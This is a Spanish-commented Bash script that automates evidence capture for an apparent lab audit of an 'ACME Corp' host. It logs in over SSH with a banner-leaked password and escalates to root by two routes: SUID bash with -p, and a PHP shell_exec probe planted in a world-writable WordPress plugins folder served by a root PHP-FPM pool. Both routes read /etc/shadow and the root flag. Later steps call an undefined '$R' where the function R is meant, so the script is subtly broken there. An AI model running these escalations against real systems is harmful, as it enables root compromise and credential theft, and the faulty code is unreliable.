#!/bin/bash
# Captura la evidencia de la auditoría ACME Corp.
# Cada artefacto lleva cabecera (fecha, objetivo, comando) + salida real.
#
# Uso:
#   export ACME_SSH_PASS='<credencial del banner SSH>'
#   ./tools/capture_evidence.sh
set -u
cd "$(dirname "$0")/.." || exit 1

TARGET="${ACME_TARGET:-172.17.0.2}"
ACME_USER="${ACME_USER:-usuario}"
ACME_SSH_PASS="${ACME_SSH_PASS:-}"
STAMP=$(date -u '+%Y-%m-%dT%H:%M:%SZ')

if [ -z "$ACME_SSH_PASS" ]; then
    echo "ERROR: define ACME_SSH_PASS (la credencial aparece en el banner SSH del objetivo)." >&2
    exit 1
fi

# Ejecuta un comando en el objetivo como «usuario».
R() {
    sshpass -p "$ACME_SSH_PASS" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o LogLevel=ERROR \
        "$ACME_USER@$TARGET" "$@" 2>/dev/null
}

cap() {           # cap <fichero> <descripción> <comando remoto>
    local out="$1" desc="$2" cmd="$3"
    mkdir -p "$(dirname "$out")"
    {
        echo "================================================================"
        echo " ACME Corp — Evidencia de auditoría"
        echo " Fecha (UTC) : $STAMP"
        echo " Objetivo    : $TARGET"
        echo " Fase        : $desc"
        echo " Comando     : $cmd"
        echo "================================================================"
        echo
    } > "$out"
    R "$cmd" >> "$out" 2>&1
    echo "  [+] $out"
}

# ─────────────────────────── 01 · RECON ───────────────────────────
cap "evidence/01-recon/nmap_full_scan.txt" \
    "Fase 1 — Reconocimiento de puertos" \
    "echo 'nmap -p- -sV -sC -sT -vv -n -Pn --min-rate=5000 $TARGET'; echo '(salida completa en nmap_acme_own)'; nmap --version | head -1"

cp nmap_acme_own "evidence/01-recon/nmap_full_scan_raw.txt"

cap "evidence/01-recon/http_maintenance_page.txt" \
    "Fase 1 — Servidor web en puerto 80" \
    "curl -s -i --max-time 10 http://127.0.0.1/ | head -40"

cap "evidence/01-recon/robots_and_migration_notes.txt" \
    "Fase 1 — robots.txt y migration_notes.txt" \
    "echo '--- robots.txt ---'; curl -s --max-time 10 http://127.0.0.1/robots.txt; echo; echo '--- migration_notes.txt ---'; curl -s --max-time 10 http://127.0.0.1/migration_notes.txt"

# ─────────────────────── 02 · INITIAL ACCESS ───────────────────────
cap "evidence/02-initial-access/ssh_banner_preauth.txt" \
    "Fase 2 — Banner SSH emitido antes de autenticar" \
    "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o BatchMode=yes usuario@$TARGET exit"

cap "evidence/02-initial-access/user_flag.txt" \
    "Fase 3 — Identidad y bandera de usuario" \
    "id; echo; echo '--- /home/usuario/user.txt ---'; cat /home/usuario/user.txt; echo; echo '--- permisos ---'; ls -la /home/usuario/user.txt"

# ─────────────────────── 03 · ENUMERATION ───────────────────────
cap "evidence/03-enumeration/suid_sgid_binaries.txt" \
    "Fase 4 — Binarios con bit SUID/SGID" \
    "find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | xargs -r ls -la 2>/dev/null"

cap "evidence/03-enumeration/php_fpm_pool_config.txt" \
    "Fase 4 — Configuracion del pool de PHP-FPM (causa raiz del Vector B)" \
    "echo '--- /etc/php/8.1/fpm/pool.d/www.conf ---'; grep -vE '^\s*;|^\s*\$' /etc/php/8.1/fpm/pool.d/www.conf; echo; echo '--- procesos php-fpm ---'; ps -eo user,pid,args | grep -E 'php-fpm' | grep -v grep"

cap "evidence/03-enumeration/apache_vhosts.txt" \
    "Fase 4 — Vhosts de Apache (servicio interno en loopback)" \
    "echo '--- sites-enabled ---'; ls -la /etc/apache2/sites-enabled/; echo; echo '--- 000-default.conf ---'; cat /etc/apache2/sites-enabled/000-default.conf; echo; echo '--- wordpress.conf ---'; cat /etc/apache2/sites-enabled/wordpress.conf"

cap "evidence/03-enumeration/wp_content_permissions.txt" \
    "Fase 4 — Permisos del arbol wp-content (777)" \
    "ls -la /var/www/wordpress/wp-content/ /var/www/wordpress/wp-content/plugins/ /var/www/wordpress/wp-content/uploads/ 2>&1; echo; echo '--- socket / fpm en escucha ---'; ss -tlnp 2>/dev/null | grep -E '8080|9000|:80|:22'"

# ───────────────────── 04 · VECTOR A (SUID) ─────────────────────
cap "evidence/04-vector-a-suid/suid_bash_privilege_test.txt" \
    "Vector A — Escalada via bit SUID en /usr/bin/bash" \
    "echo '=== permisos de /usr/bin/bash ==='; ls -la /usr/bin/bash /usr/bin/dash; stat -c '%n %A %U:%G %a' /usr/bin/bash /usr/bin/dash; echo; echo '=== bash SIN -p (euid restablecido) ==='; /usr/bin/bash -c 'id; echo euid=\$(id -u)'; echo; echo '=== bash CON -p (euid conservado) ==='; /usr/bin/bash -p -c 'id; echo euid=\$(id -u)'; echo; echo '=== dash CON -p ==='; /usr/bin/dash -p -c 'id'"

cap "evidence/04-vector-a-suid/root_flag.txt" \
    "Vector A — Lectura de la bandera root y prueba de escritura" \
    "echo '--- lectura de /root/root.txt ---'; /usr/bin/bash -p -c 'cat /root/root.txt'; echo; echo '--- escritura en /root ---'; /usr/bin/bash -p -c 'echo prueba > /root/.audit_canary && echo \"WRITE TO /root: OK\" && rm -f /root/.audit_canary'; echo; echo '--- lectura de /etc/shadow ---'; /usr/bin/bash -p -c 'head -1 /etc/shadow'"

# ──────────────── 05 · VECTOR B (WORDPRESS/FPM) ────────────────
cap "evidence/05-vector-b-wordpress/fpm_executes_as_root.txt" \
    "Vector B — PHP ejecutado como root por el pool de FPM" \
    "echo '--- pool www ---'; grep -E '^(user|group|listen)' /etc/php/8.1/fpm/pool.d/www.conf; echo; echo '--- vhost wordpress ---'; grep -A2 FilesMatch /etc/apache2/sites-enabled/wordpress.conf; echo; echo '--- permisos plugins/ ---'; stat -c '%n %A %U:%G %a' /var/www/wordpress/wp-content/plugins/"

echo
echo "=== 05: captura del Vector B (requiere desplegar la sonda PHP) ==="

# La sonda se despliega, se ejecuta y se elimina en el mismo paso.
$R 'cat > /var/www/wordpress/wp-content/plugins/audit_probe.php <<"PHPEOF"
<?php
echo "=== CONTEXTO DE EJECUCION (vhost 127.0.0.1:8080 -> PHP-FPM) ===\n";
echo "id      : " . shell_exec("id");
echo "whoami  : " . shell_exec("whoami");
echo "pool www: " . shell_exec("grep -E \"^(user|group)\" /etc/php/8.1/fpm/pool.d/www.conf | tr \"\\n\" \" \"");
echo "\n=== COMANDO: cat /root/root.txt ===\n";
echo shell_exec("cat /root/root.txt");
echo "\n=== COMANDO: head -1 /etc/shadow ===\n";
echo shell_exec("head -1 /etc/shadow");
PHPEOF
ls -la /var/www/wordpress/wp-content/plugins/audit_probe.php' > /tmp/probe_deploy.txt 2>&1

cat /tmp/probe_deploy.txt >> /tmp/vb_raw.txt 2>/dev/null || true

$R 'curl -s --max-time 10 "http://127.0.0.1:8080/wp-content/plugins/audit_probe.php"' >> /tmp/vb_raw.txt 2>&1

{
    echo "================================================================"
    echo " ACME Corp — Evidencia de auditoría"
    echo " Fecha (UTC) : $STAMP"
    echo " Objetivo    : $TARGET"
    echo " Fase        : Vector B — WordPress (plugins/ 777) + PHP-FPM como root"
    echo " Secuencia   : 1) escritura de la sonda en wp-content/plugins/"
    echo "               2) peticion HTTP a 127.0.0.1:8080"
    echo "               3) Apache delega en PHP-FPM, que ejecuta como root"
    echo "================================================================"
    echo
    echo "--- 1) Despliegue de la sonda ---"
    cat /tmp/probe_deploy.txt
    echo
    echo "--- 2) Respuesta HTTP (uid=0(root)) ---"
    cat /tmp/vb_raw.txt | sed -n '/=== CONTEXTO/,$p'
} > "evidence/05-vector-b-wordpress/fpm_executes_as_root.txt"
echo "  [+] evidence/05-vector-b-wordpress/fpm_executes_as_root.txt"

# ───────────────────── 06 · LIMPIEZA ─────────────────────
$R 'rm -f /var/www/wordpress/wp-content/plugins/audit_probe.php /tmp/probe_deploy.txt /tmp/vb_raw.txt /tmp/payload.php /tmp/fcgi_pwn.py /tmp/fcgi_debug.py; echo "--- plugins/ tras la limpieza ---"; ls -la /var/www/wordpress/wp-content/plugins/; echo; echo "--- /tmp ---"; ls -la /tmp/; echo; echo "--- la sonda ya no responde con su contenido ---"; curl -s --max-time 8 "http://127.0.0.1:8080/wp-content/plugins/audit_probe.php" | grep -c "CONTEXTO DE EJECUCION"' > /tmp/cleanup.txt 2>&1

{
    echo "================================================================"
    echo " ACME Corp — Evidencia de auditoría"
    echo " Fecha (UTC) : $STAMP"
    echo " Fase        : Limpieza de artefactos en el objetivo"
    echo "================================================================"
    echo
    cat /tmp/cleanup.txt
} > "evidence/06-cleanup/cleanup_verification.txt"
rm -f /tmp/cleanup.txt
echo "  [+] evidence/06-cleanup/cleanup_verification.txt"

echo
echo "Captura completada."
